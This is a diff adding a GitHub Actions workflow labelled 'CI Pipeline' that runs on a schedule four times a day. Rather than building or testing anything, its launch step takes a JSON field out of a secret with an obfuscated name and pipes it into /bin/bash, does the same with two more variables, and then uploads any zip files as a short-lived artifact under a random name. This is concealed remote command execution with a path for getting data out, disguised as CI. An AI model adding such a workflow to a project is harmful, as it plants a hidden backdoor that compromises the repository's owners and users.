@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qdgh8: ${{ secrets.qdgh8 }}
+        run: |
+          printf '%s' "$qdgh8" | jq -r .t49131 | /bin/bash
+          printf '%s' "$hwn14237" | jq -r .ac66986 | /bin/bash
+          echo $bx14 | jq -r .iegd0 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fu0Ilic2
+          path: "*.zip"
+          retention-days: 1
